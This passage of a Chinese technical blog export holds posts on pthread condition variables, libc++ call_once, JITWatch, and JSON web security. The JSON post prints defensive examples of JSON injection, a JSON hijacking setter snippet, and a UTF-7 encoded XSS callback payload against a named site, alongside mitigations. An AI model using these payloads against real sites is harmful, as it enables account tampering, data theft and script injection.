假定有三个线程，线程A正在执行pthread_cond_wait，线程B正在执行pthread_cond_signal，线程C正准备执行pthread_cond_wait函数。 1234567891011121314151617181920212223pthread_cond_wait(mutex, cond): value = cond-&gt;value; /* 1 */ pthread_mutex_unlock(mutex); /* 2 */ pthread_mutex_lock(cond-&gt;mutex); /* 10 */ if (value == cond-&gt;value) &#123; /* 11 */ me-&gt;next_cond = cond-&gt;waiter; cond-&gt;waiter = me; pthread_mutex_unlock(cond-&gt;mutex); unable_to_run(me); &#125; else pthread_mutex_unlock(cond-&gt;mutex); /* 12 */ pthread_mutex_lock(mutex); /* 13 */ pthread_cond_signal(cond): pthread_mutex_lock(cond-&gt;mutex); /* 3 */ cond-&gt;value++; /* 4 */ if (cond-&gt;waiter) &#123; /* 5 */ sleeper = cond-&gt;waiter; /* 6 */ cond-&gt;waiter = sleeper-&gt;next_cond; /* 7 */ able_to_run(sleeper); /* 8 */ &#125; pthread_mutex_unlock(cond-&gt;mutex); /* 9 */ 线程A执行了第1,2步，这时它释放了mutex，然后线程B拿到了这个mutext，并且pthread_cond_signal函数时执行并返回了。于是线程B就是一个所谓的“spurious wakeup”。 为什么pthread_cond_wait函数里一进入，就释放了mutex？没有找到什么解析。。 查看了glibc的源代码，大概可以看出上面的一些影子，但是太复杂了，也没有搞明白为什么。。 /build/buildd/eglibc-2.19/nptl/pthread_cond_wait.c /build/buildd/eglibc-2.19/nptl/pthread_cond_signal.c 不过从上面的解析，可以发现《UNIX高级编程》里的说明是错误的（可能是因为太久了）。 The caller passes it locked to the function, which then atomically places the calling thread on the list of threads waiting for the condition and unlocks the mutex. 上面的伪代码，一进入pthread_cond_wait函数就释放了mutex，明显和书里的不一样。 wait morphing优化在《UNIX环境高级编程》的示例代码里，是先调用pthread_mutex_unlock，再调用pthread_cond_signal。 1234567void enqueue_msg(struct msg *mp) &#123; pthread_mutex_lock(&amp;qlock); mp-&gt;m_next = workq; workq = mp; pthread_mutex_unlock(&amp;qlock); pthread_cond_signal(&amp;qready);&#125; 有的地方给出的是先调用pthread_cond_signal，再调用pthread_mutex_unlock： 1234567void enqueue_msg(struct msg *mp) &#123; pthread_mutex_lock(&amp;qlock); mp-&gt;m_next = workq; workq = mp; pthread_cond_signal(&amp;qready); pthread_mutex_unlock(&amp;qlock);&#125; 先unlock再signal，这有个好处，就是调用enqueue_msg的线程可以再次参与mutex的竞争中，这样意味着可以连续放入多个消息，这个可能会提高效率。类似Java里ReentrantLock的非公平模式。网上有些文章说，先singal再unlock，有可能会出现一种情况是被singal唤醒的线程会因为不能马上拿到mutex（还没被释放），从而会再次休眠，这样影响了效率。从而会有一个叫“wait morphing”优化，就是如果线程被唤醒但是不能获取到mutex,则线程被转移(morphing)到mutex的等待队列里。 但是我查看了下glibc的源代码，貌似没有发现有这种“wait morphing”优化。 man文档里提到： The pthread_cond_broadcast() or pthread_cond_signal() functions may be called by a thread whether or not it currently owns the mutex that threads calling pthread_cond_wait() or pthread_cond_timedwait() have associated with the condition variable during their waits; however, if predictable scheduling behavior is required, then that mutex shall be locked by the thread calling pthread_cond_broadcast() or pthread_cond_signal(). 可见在调用singal之前，可以不持有mutex，除非是“predictable scheduling”，可预测的调度行为。这种可能是实时系统才有这种严格的要求。 为什么要用while循环来判断条件是否成立？12while (workq == NULL) pthread_cond_wait(&amp;qready, &amp;qlock); 而不用if来判断？ 12if (workq == NULL) pthread_cond_wait(&amp;qready, &amp;qlock); 一个原因是spurious wakeup，但即使没有spurious wakeup，也是要用While来判断的。 比如线程A，线程B在pthread_cond_wait函数中等待，然后线程C把消息放到队列里，再调用pthread_cond_broadcast，然后线程A先获取到mutex，处理完消息完后，这时workq就变成NULL了。这时线程B才获取到mutex，那么这时实际上是没有资源供线程B使用的。所以从pthread_cond_wait函数返回之后，还是要判断条件是否成功，如果成立，再进行处理。 pthread_cond_signal和pthread_cond_broadcast在这篇文章里，http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html 给出的示例代码7里，认为调用pthread_cond_broadcast来唤醒所有的线程是比较好的写法。但是我认为pthread_cond_signal和pthread_cond_broadcast是两个不同东东，不能简单合并在同一个函数调用。只唤醒一个效率和唤醒全部等待线程的效率显然不能等同。典型的condition是用CLH或者MCS来实现的，要通知所有的线程，则要历遍链表，显然效率降低。另外，C++11里的condition_variable也提供了notify_one函数。 http://en.cppreference.com/w/cpp/thread/condition_variable/notify_one mutex，condition是不是公平(fair)的？这个在参考文档里没有说明，在网上找了些资料，也没有什么明确的答案。 我写了个代码测试，发现mutex是公平的。condition的测试结果也是差不多。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER; volatile int mutexCount = 0;void mutexFairTest()&#123; int localCount = 0; while(1)&#123; pthread_mutex_lock(&amp;lock); __sync_fetch_and_add(&amp;mutexCount, 1); localCount += 1; if(mutexCount &gt; 100000000)&#123; break; &#125; pthread_mutex_unlock(&amp;lock); &#125; pthread_mutex_unlock(&amp;lock); printf("localCount:%d\n", localCount);&#125; int main() &#123; pthread_mutex_lock(&amp;lock); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_create(new pthread_t, NULL, (void * (*)(void *))&amp;mutexFairTest, NULL); pthread_mutex_unlock(&amp;lock); sleep(100);&#125; 输出结果是： 123456localCount:16930422localCount:16525616localCount:16850294localCount:16129844localCount:17329693localCount:16234137 还特意在一个单CPU的虚拟机上测试了下。输出的结果差不多。操作系统是ububtu14.04。 连续调用pthread_cond_signal，会唤醒多少次/多少个线程？比如线程a,b 在调用pthread_cond_wait之后等待，然后线程c, d同时调用pthread_cond_signal，那么a, b线程是否都能被唤醒？ 会不会出现c, d, a 这种调用顺序，然后b一直在等待，然后死锁了？ 根据文档： The pthread_cond_signal() function shall unblock at least one of the threads that are blocked on the specified condition variable cond (if any threads are blocked on cond). 因此，如果有线程已经在调用pthread_cond_wait等待的情况下，pthread_cond_signal调用至少会唤醒等待中的一个线程。 所以不会出现上面的线程b一直等待的情况。 但是，我们再仔细考虑下： 如何确认线程a, b 调用pthread_cond_wait完成了？还是只是刚切换到内核态？显然是没有办法知道的。 所以，我们平时编程肯定不会写这样的代码，应该是共享变量，在获取到锁之后，再修改变量。这样子来做同步。参考上面《UNIX环境高级编程》的例子。 不过，这个问题也是挺有意思的。 参考 http://en.wikipedia.org/wiki/Spurious_wakeup http://siwind.iteye.com/blog/1469216 http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html http://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
        <tag>posix</tag>
        <tag>condition</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++11中once_flag，call_once实现分析]]></title>
    <url>%2Fcpp11-once_flag-call_once%2F</url>
    <content type="text"><![CDATA[前言本文的分析基于llvm的libc++，而不是gun的libstdc++，因为libstdc++的代码里太多宏了，看起来蛋疼。 在多线程编程中，有一个常见的情景是某个任务只需要执行一次。在C++11中提供了很方便的辅助类once_flag，call_once。 声明首先来看一下once_flag和call_once的声明： 12345678910struct once_flag&#123; constexpr once_flag() noexcept; once_flag(const once_flag&amp;) = delete; once_flag&amp; operator=(const once_flag&amp;) = delete;&#125;;template&lt;class Callable, class ...Args&gt; void call_once(once_flag&amp; flag, Callable&amp;&amp; func, Args&amp;&amp;... args); &#125; // std 可以看到once_flag是不允许修改的，拷贝构造函数和operator=函数都声明为delete，这样防止程序员乱用。另外，call_once也是很简单的，只要传进一个once_flag，回调函数，和参数列表就可以了。 示例看一个示例： http://en.cppreference.com/w/cpp/thread/call_once 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;mutex&gt; std::once_flag flag; void do_once()&#123; std::call_once(flag, []()&#123; std::cout &lt;&lt; "Called once" &lt;&lt; std::endl; &#125;);&#125; int main()&#123; std::thread t1(do_once); std::thread t2(do_once); std::thread t3(do_once); std::thread t4(do_once); t1.join(); t2.join(); t3.join(); t4.join();&#125; 保存为main.cpp，如果是用g++或者clang++来编绎： 123g++ -std=c++11 -pthread main.cppclang++ -std=c++11 -pthread main.cpp./a.out 可以看到，只会输出一行 1Called once 值得注意的是，如果在函数执行中抛出了异常，那么会有另一个在once_flag上等待的线程会执行。 比如下面的例子： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;mutex&gt; std::once_flag flag; inline void may_throw_function(bool do_throw)&#123; // only one instance of this function can be run simultaneously if (do_throw) &#123; std::cout &lt;&lt; "throw\n"; // this message may be printed from 0 to 3 times // if function exits via exception, another function selected throw std::exception(); &#125; std::cout &lt;&lt; "once\n"; // printed exactly once, it's guaranteed that // there are no messages after it&#125; inline void do_once(bool do_throw)&#123; try &#123; std::call_once(flag, may_throw_function, do_throw); &#125; catch (...) &#123; &#125;&#125; int main()&#123; std::thread t1(do_once, true); std::thread t2(do_once, true); std::thread t3(do_once, false); std::thread t4(do_once, true); t1.join(); t2.join(); t3.join(); t4.join();&#125; 输出的结果可能是0到3行throw，和一行once。 实际上once_flag相当于一个锁，使用它的线程都会在上面等待，只有一个线程允许执行。如果该线程抛出异常，那么从等待中的线程中选择一个，重复上面的流程。 实现分析once_flag实际上只有一个unsigned long state_的成员变量，把call_once声明为友元函数，这样call_once能修改state__变量： 123456789101112struct once_flag&#123; once_flag() _NOEXCEPT : __state_(0) &#123;&#125;private: once_flag(const once_flag&amp;); // = delete; once_flag&amp; operator=(const once_flag&amp;); // = delete; unsigned long __state_; template&lt;class _Callable&gt; friend void call_once(once_flag&amp;, _Callable);&#125;; call_once则用了一个__call_once_param类来包装函数，很常见的模板编程技巧。 1234567891011121314151617181920template &lt;class _Fp&gt;class __call_once_param&#123; _Fp __f_;public: explicit __call_once_param(const _Fp&amp; __f) : __f_(__f) &#123;&#125; void operator()() &#123; __f_(); &#125;&#125;;template&lt;class _Callable&gt;void call_once(once_flag&amp; __flag, _Callable __func)&#123; if (__flag.__state_ != ~0ul) &#123; __call_once_param&lt;_Callable&gt; __p(__func); __call_once(__flag.__state_, &amp;__p, &amp;__call_once_proxy&lt;_Callable&gt;); &#125;&#125; 最重要的是__call_once函数的实现： 12345678910111213141516171819202122232425262728293031323334353637static pthread_mutex_t mut = PTHREAD_MUTEX_INITIALIZER;static pthread_cond_t cv = PTHREAD_COND_INITIALIZER; void__call_once(volatile unsigned long&amp; flag, void* arg, void(*func)(void*))&#123; pthread_mutex_lock(&amp;mut); while (flag == 1) pthread_cond_wait(&amp;cv, &amp;mut); if (flag == 0) &#123;#ifndef _LIBCPP_NO_EXCEPTIONS try &#123;#endif // _LIBCPP_NO_EXCEPTIONS flag = 1; pthread_mutex_unlock(&amp;mut); func(arg); pthread_mutex_lock(&amp;mut); flag = ~0ul; pthread_mutex_unlock(&amp;mut); pthread_cond_broadcast(&amp;cv);#ifndef _LIBCPP_NO_EXCEPTIONS &#125; catch (...) &#123; pthread_mutex_lock(&amp;mut); flag = 0ul; pthread_mutex_unlock(&amp;mut); pthread_cond_broadcast(&amp;cv); throw; &#125;#endif // _LIBCPP_NO_EXCEPTIONS &#125; else pthread_mutex_unlock(&amp;mut);&#125; 里面用了全局的mutex和condition来做同步，还有异常处理的代码。其实当看到mutext和condition时，就明白是如何实现的了。里面有一系列的同步操作，可以参考另外一篇blog： http://blog.csdn.net/hengyunabc/article/details/27969613 并行编程之条件变量（posix condition variables） 尽管代码看起来很简单，但是要仔细分析它的各种时序也比较复杂。 有个地方比较疑惑的： 对于同步的state变量，并没有任何的memory order的保护，会不会有问题？ 因为在JDK的代码里LockSupport和逻辑和上面的__call_once函数类似，但是却有memory order相关的代码： OrderAccess::fence(); 其它的东东有个东东值得提一下，在C++中，static变量的初始化，并不是线程安全的。 比如 1234void func()&#123; static int value = 100; ...&#125; 实际上相当于这样的代码： 123456789int __flag = 0void func()&#123; static int value; if(!__flag)&#123; value = 100; __flag = 1; &#125; ...&#125; 总结还有一件事情要考虑：所有的once_flag和call_once都共用全局的mutex和condition会不会有性能问题？ 首先，像call_once这样的需求在一个程序里不会太多。另外，临界区的代码是比较很少的，只有判断各自的flag的代码。 如果有上百上千个线程在等待once_flag，那么pthread_cond_broadcast可能会造成“惊群”效果，但是如果有那么多的线程都上等待，显然程序设计有问题。 还有一个要注意的地方是 once_flag的生命周期，它必须要比使用它的线程的生命周期要长。所以通常定义成全局变量比较好。 参考 http://libcxx.llvm.org/ http://en.cppreference.com/w/cpp/thread/once_flag http://en.cppreference.com/w/cpp/thread/call_once]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈web安全之JSON]]></title>
    <url>%2Fweb-json-security%2F</url>
    <content type="text"><![CDATA[前言JSON（JavaScript Object Notation），可以说是事实的浏览器，服务器交换数据的标准了。目测其它的格式如XML，或者其它自定义的格式会越来越少。 为什么JSON这么流行？和JavaScript无缝对接是一个原因。 还有一个重要原因是可以比较轻松的实现跨域。如果是XML，或者其它专有格式，则很难实现跨域，要通过flash之类来实现。 任何一种数据格式，如何解析处理不当，都会存在安全漏洞。下面扯谈下JSON相关的一些安全东东。在介绍之前，先来提几个问题： 为什么XMLHttpRequest要遵守同源策略？ XMLHttpRequest 请求会不会带cookie? &lt;script scr=&quot;...&quot;&gt; 的标签请求会不会带cookie？ 向一个其它域名的网站提交一个form，会不会带cookie？ CORS请求能不能带cookie？ JSON注入有的时候，可能是为了方便，有人会手动拼接下JSON，但是这种随手代码，却可能带来意想不到的安全隐患。 利用字符串拼接第一种方式，利用字符串拼接： 12345String user = "test01";String password = "12345', admin:'true";String json = "&#123;user:'%s', password:'%s'&#125;";System.out.println(String.format(json, user, password));//&#123;user:'test01', password:'12345', admin:'true'&#125; 用户增加了管理员权限。 利用Parameter pollution， 类似http parameter pollution第二种，利用Parameter pollution， 类似http parameter pollution 12345String string = "&#123;user:'test01',password:'hello', password:'world'&#125;";JSONObject parse = JSON.parseObject(string);String password = parse.getString("password");System.out.println(password);//world 当JSON数据key重复了会怎么处理？大部分JSON解析库都是后面的参数覆盖了前面的。 下面的演示了修改别人密码的例子： 1234567891011//user%3Dtest01%26password%3D12345%27%2Cuser%3Dtest02"//user=test01&amp;password=12345',user=test02HttpServletRequest request = null;String user = request.getParameter("user");//检查test01是否登陆String password = request.getParameter("password");String content = "&#123;user:'" + user + "', password:'" + password + "'&#125;"; User user = JSON.parseObject(content, User.class);//&#123;"password":"12345","user":"test02"&#125;updateDb(user); 所以说，不要手动拼接JSON字符串 浏览器端应该如何处理JSON数据？像eval这种方式，自然是不能采用的。 现在的浏览器都提供了原生的方法 JSON.parse(str) 来转换为JS对象。 如果是IE8之前的浏览器，要使用这个库来解析：https://github.com/douglascrockford/JSON-js参考：http://zh.wikipedia.org/wiki/JSON#.E5.AE.89.E5.85.A8.E6.80.A7.E5.95.8F.E9.A1.8C JQuery里内置了JSON解析库 JSONP callback注入jsonp工作原理简单介绍jsonp的工作原理。 用js在document上插入一个&lt;script&gt;标签，标签的src指向远程服务器的API地址。客户端和服务器约定一个回调函数的名字，然后服务器返回回调函数包裹着的数据，然后浏览器执行回调函数，取得数据。 比如jquery是这样子实现的： 1234var url = 'http://localhost:8080/testJsonp?callback=?';$.getJSON(url, function(data)&#123; alert(data)&#125;); jquery自动把?转成了一个带时间戳特别的函数（防止缓存）： 1http://localhost:8080/testJsonp?callback=jQuery1102045087050669826567_1386230674292&amp;_=1386230674293 相当于插入了这么一个&lt;script&gt;标签： 1&lt;script src="http://localhost:8080/testJsonp?callback=jQuery1102045087050669826567_1386230674292&amp;_=1386230674293"&gt;&lt;/script&gt; 服务器返回的数据是这样子的： 1jQuery1102045087050669826567_1386230674292(&#123;'name':'abc', 'age':18&#125;) 浏览器会执行直接执行这个JS函数。 所以，如果在callback函数的名字上做点手脚，可以执行任意的JS代码。所以说callback名字一定要严格过滤。 当然，callback函数的名字通常是程序自己控制的，但是不能排除有其它被利用的可能。那么callback函数的名字，如何过滤？应当只允许合法的JS函数命名，用正则来匹配应该是这样子的： 1^[0-9a-zA-Z_.]+$ 正则可能比较慢，可以写一个函数来判断： 123456789101112131415static boolean checkJSONPCallbackName(String name) &#123; try &#123; for (byte c : name.getBytes("US-ASCII")) &#123; if ((c &gt;= '0' &amp;&amp; c &lt;= '9') || (c &gt;= 'a' &amp;&amp; c &lt;= 'z') || (c &gt;= 'A' &amp;&amp; c &lt;= 'Z') || c == '_') &#123; continue; &#125; else &#123; return false; &#125; &#125; return true; &#125; catch (Throwable t) &#123; return false; &#125;&#125; 实际上对callback函数名字进行严格检验还有其它的一个好处，就是防范了很多UTF-7编码攻击。 因为UTF-7编码的头部都是带有特殊字符的，如”+/v8”，”+/v9”，这样就过滤掉非法编码的请求了。 update: 2016-3-22 spring 4.1里有一个AbstractJsonpResponseBodyAdvice ，里面是用正则匹配来判断是否合法的jsonp函数名。 123456public abstract class AbstractJsonpResponseBodyAdvice extends AbstractMappingJacksonResponseBodyAdvice &#123; /** * Pattern for validating jsonp callback parameter values. */ private static final Pattern CALLBACK_PARAM_PATTERN = Pattern.compile("[0-9A-Za-z_\\.]*"); jsonp的请求的验证jsonp在使用的时候，还有容易犯的错误是没有验证用户的身份。 第一，操作是否是用户自己提交的，而不是别的网页用&lt;script&gt;标签，或者用&lt;form&gt;提交的 所以要检查request的refer，或者验证token。这个实际是CSRF防护的范畴，但是很容易被忽略。 第二，要验证用户的权限。 很多时候，可能只是验证了用户是否登录 。却没有仔细判断用户是否有权限。 比如通过JSONP请求修改了别的用户的数据。所以说，一定要难证来源。判断refer，验证用户的身份。 到乌云上搜索，可以找到不少类似的漏洞，都是因为没有严格验证用户的权限。http://www.wooyun.org/searchbug.php?q=jsonp JSON hijacking在JS里可以为对象定义一些setter函数，这样的话就存在了可以利用的漏洞。比如在浏览器的JS Console里执行： 1234window.__defineSetter__('x', function() &#123;alert('x is being assigned!');&#125;);window.x=1; 会很神奇地弹出一个alert窗口，说明我们定义的setter函数起作用了。结合这个，当利用&lt;script&gt;标签请求外部的一个JSON API时，如果返回的是数组型，就可以利用窃取数据。 比如有这样的一个API：http://www.test.com/friends 返回的数据是JSON Array： 1[&#123;'user':'test01','age':18&#125;,&#123;'user':'test02,'age':19&#125;,&#123;'user':'test03','age':20&#125;] 在攻击页面上插入以下的代码，就可以获取到用户的所有的朋友的信息。 1234567&lt;script&gt; Object.prototype.__defineSetter__('user',function(obj) &#123;alert(obj); &#125; );&lt;/script&gt;&lt;script src="http://www.test.com/friends"&gt;&lt;/script&gt; 这个漏洞在前几年很流行，比如qq邮箱的一个漏洞：http://www.wooyun.org/bugs/wooyun-2010-046 现在的浏览器都已经修复了，可以下载一个Firefox3.0版本来测试下。目前的浏览器在解析JSON Array字符串的时候，不再去触发setter函数了。但对于object.xxx 这样的设置，还是会触发。 IE的utf-7编码解析问题这个漏洞也曾经很流行。利用的是老版的IE可以解析utf-7编码的字符串或者文件，绕过服务器的过滤。举个乌云上的例子：http://www.wooyun.org/bugs/wooyun-2011-01293有这样的一个jsonp调用接口： http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg url decoder之后是： http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=+/v8 +ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg 因为jsonp调用是直接返回callback包装的数据，所以实际上，上面的请求直接返回的是： 1+/v8 +ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-(调用结果数据) IE做了UTF-7解码之后数据是这样子的： 1&lt;htm&gt;&lt;body&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/body&gt;&lt;/htm&gt;(调用结果数据) 于是，就执行了XSS。另外用IFrame也是可以的。但是我在IE8上测试，url的后缀需要是html才会触发。IE把没有声明返回Content-Type的请求当做了”text/html”类型的，然后解析就有问题了。 只要服务器端显式设置了Content-Type为”application/json”，则IE不会识别编码，就不会触发漏洞。所以说服务器端的Content-Type一定要设置对。尽管设置之后调试有点麻烦，但是却大大提高了安全性。 JSON格式设置为：”application/json” JavaScript设置为：”application/x-javascript” JavaScript还有一些设置为：”text/javascript”等，都是不规范的。 其它的一些东东MongoDB注入这个实际上就是JSON注入，简单的字符串拼接，可能会引发各种数据被修改的问题。 JSON解析库的问题有些JSON库解析库支持循环引用，那么是否可以构造特别的数据，导致其解析失败？从而引起CPU使用过高，拒绝服务等问题？ FastJSON的一个StackOverflowError Bug： https://github.com/alibaba/fastjson/issues/76 有些JSON库解析有问题： http://www.freebuf.com/articles/web/10672.html JSON-P有人提出一个JSON-P的规范，但是貌似目前都没有浏览器有支持这个的。原理是对于JSONP请求，浏览器可以要求服务器返回的MIME是”application/json-p”，这样可以严格校验是否合法的JSON数据。 CORS（Cross-Origin Resource Sharing）为了解决跨域调用的安全性问题，目前实际上可用的方案是CORS： https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORShttp://www.w3.org/TR/cors/ 原理是通过服务器端设置允许跨域调用，然后浏览器就允许XMLHttpRequest跨域调用了。 CORS可以发起GET/POST请求，不像JSONP，只能发起GET请求。 默认情况下，CORS请求是不带cookie的。 我个人认为，这个方案也很蛋疼，一是需要服务器配置，二是协议复杂。浏览器如果不能确定是否能够跨域调用，还要先进行一个Preflight Request。。 实际上，即使服务器不允许CORS，XMLHttpRequest请求实际上是发送出去，并且返回数据的了，只是浏览器没有让JS环境拿到而已。 另外，我认为有另外一种数据泄露的可能：黑客可能控制了某个路由，他不能随意抓包，但是他可以在回应头里插入一些特别的头部，比如： 1Access-Control-Allow-Credentials: true 那么，这时XMLHttpRequest请求就是带cookie的了。 最初的问题回到最初的问题： 为什么XMLHttpRequest要遵守同源策略？ 即使XMLHttpRequest是不带Cookie的，也是有可能造成数据泄露的。比如内部网站是根据IP限制访问的，如果XMLHttpRequest不遵守同源策略，那么攻击者可以在用户浏览网页的时候，发起请求，取得内部网站数据。 XMLHttpRequest 请求会不会带cookie? 同域情况下会，不同域情况下不会。如果服务器设置Access-Control-Allow-Credentials: true ，也是可以跨域带Cookie的。 &lt;script scr=&quot;...&quot;&gt; 的标签请求会不会带cookie？ 会。 向一个其它域名的网站提交一个form，会不会带cookie？ 会。 总结 禁止手动拼接JSON字符串，一律应当用JSON库输出。也不应使用自己实现的ObjectToJson等方法，因为可能有各种没有考虑到的地方。 jsonp请求的callback要严格过滤，只允许”_”，0到9，a-z, A-Z，即合法的javascript函数的命名。 jsonp请求也要判断合法性，比如用户是否登陆（这点很容易被忽略）。 设置好Content-Type（这点对于调试不方便，但是提高了安全性）。 以jsonp方式调用第三方的接口，实际相当于引入了第三方的JS代码，要慎重。 参考 http://www.json.org/ http://www.slideshare.net/wurbanski/nosql-no-security https://github.com/douglascrockford/JSON-js http://toolswebtop.com/ 在线编码转换，可以转换UTF-7 http://www.thespanner.co.uk/2011/05/30/json-hijacking/ http://www.thespanner.co.uk/2009/11/23/bypassing-csp-for-fun-no-profit/ http://stackoverflow.com/questions/1830050/why-same-origin-policy-for-xmlhttprequest]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>javascript</tag>
        <tag>web</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用hsdis和JITWatch查看分析HotSpot JIT compiler生成的汇编代码]]></title>
    <url>%2Fjvm-hsdis-jitwatch%2F</url>
    <content type="text"><![CDATA[安装hsdis要查看JIT生成的汇编代码，要先装一个反汇编器：hsdis。从名字来看，即HotSpot disassembler。 实际就是一个动态链接库。网络上有已经编绎好的文件，直接下载即可。 国内的：http://hllvm.group.iteye.com/ 也可以自己编绎，只是编绎hsdis，还是比较快的。 参考这里：http://www.chrisnewland.com/building-hsdis-on-linux-amd64-on-debian-369 官方的参考文档： https://wikis.oracle.com/display/HotSpotInternals/PrintAssembly 简而言之，安装只要把下载到，或者编绎好的so文件放到对应的Java安装路径下即可。 典型的情况是把下载到的 hsdis-amd64.so 放到 /usr/lib/jvm/java-7-oracle/jre/lib/amd64/ 目录下。 可以用下面这个命令来查看是否安装成功。 java -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly -version 如果输出有： Java HotSpot(TM) 64-Bit Server VM warning: PrintAssembly is enabled 则安装成功。 安装JITWatchhsdis自然是很重要，但是今天的主角是JITWatch，一个分析展现JIT日志等的图形界面工具，非常的好用。 https://github.com/AdoptOpenJDK/jitwatch 首先下载jar包，这里下载的是JDK7版本的： wget https://adopt-openjdk.ci.cloudbees.com/job/jitwatch/jdk=JDK_1.7/ws/jitwatch-1.0.0-SNAPSHOT-JDK_1.7.tar.gz 解压得到jar 文件。 下载代码文件，主要是为了相关的依赖jar： wget https://github.com/AdoptOpenJDK/jitwatch/archive/master.zip 解压，从lib目录得到相关的jar包。和前面得到的JITWatch的jar包放在一起。 用这个命令启动： 1java -cp /usr/lib/jvm/java-7-oracle/lib/tools.jar:/usr/lib/jvm/java-7-oracle/jre/lib/jfxrt.jar:jitwatch-1.0.0-SNAPSHOT.jar:slf4j-api-1.7.7.jar:hamcrest-core-1.3.jar:logback-classic-1.1.2.jar:logback-core-1.1.2.jar com.chrisnewland.jitwatch.launch.LaunchUI 启动后显示的界面如下，左上方有一个sanbox的按钮，点击会在当前目录下生成一个sanbox文件夹，里面存放着sanbox这个示例相关的代码。 点击sanbox就可以随便尝试下功能了。 生成JIT log文件首先要写一个足够复杂的类，让JIT编绎器认为它需要进行优化，不然产生的日志可能没什么内容。我在这里被坑了不少时间，怎么死活都没有日志。。 12345678910111213141516171819202122public class Test &#123; public volatile long sum = 0; public int add(int a, int b) &#123; int temp = a + b; sum += temp; return temp; &#125; public static void main(String[] args) &#123; Test test = new Test(); int sum = 0; for (int i = 0; i &lt; 1000000; i++) &#123; sum = test.add(sum, 1); &#125; System.out.println("Sum:" + sum); System.out.println("Test.sum:" + test.sum); &#125;&#125; 加上一些参数来执行程序，就可以直接生成JIT log文件了，比如为Test类生成： 12javac Test.javajava -server -XX:+UnlockDiagnosticVMOptions -XX:+TraceClassLoading -XX:+PrintAssembly -XX:+LogCompilation -XX:LogFile=live.log Test 注意生成的log文件里，可能会有一些class path相关的东东，所以JITWatch有可能会解析失败。这时注意看左下的“Errors”。 个人推荐在Eclipse里配置生成JIT log，这样使用起来更方便。 在“Run Configuration”里配置上JVM参数： 1-server -XX:+UnlockDiagnosticVMOptions -XX:+TraceClassLoading -XX:+PrintAssembly -XX:+LogCompilation -XX:LogFile=$&#123;java_type_name&#125;.log 然后，当执行时，会自动生成JIT log。 在JITWatch里，“Open Log”，打开生成的Test.log，然后配置config： 然后，点”Start”就可以查看到分析的结果了。 这是一个分析结果的展示，左边是源代码，中间是ByteCode，右边是汇编代码： JITWatch还有很多强大的功能。具体请参考wiki： https://github.com/AdoptOpenJDK/jitwatch/wiki 比如查看函数是否inline，循环展开，分支预测等。 作者有一个PDF介绍： http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf 视频： https://skillsmatter.com/skillscasts/5243-chris-newland-hotspot-profiling-with-jit-watch Java里volatile的实现从生成的汇编代码，可以看出Java里volatile的实现是用lock指令前缀来实现的： 1230x00007f80950601b0: lock addl $0x0,(%rsp) ;*putfield sum ; - Test::add@12 (line 6) ; - Test::main@18 (line 16) 更加关于lock指令前缀，请参考这里：http://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly 参考 http://psy-lob-saw.blogspot.com/2013/01/java-print-assembly.html http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>hsdis</tag>
        <tag>hotspot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈网络编程之Tcp SYN flood洪水攻击]]></title>
    <url>%2Ftcp-syn-flood%2F</url>
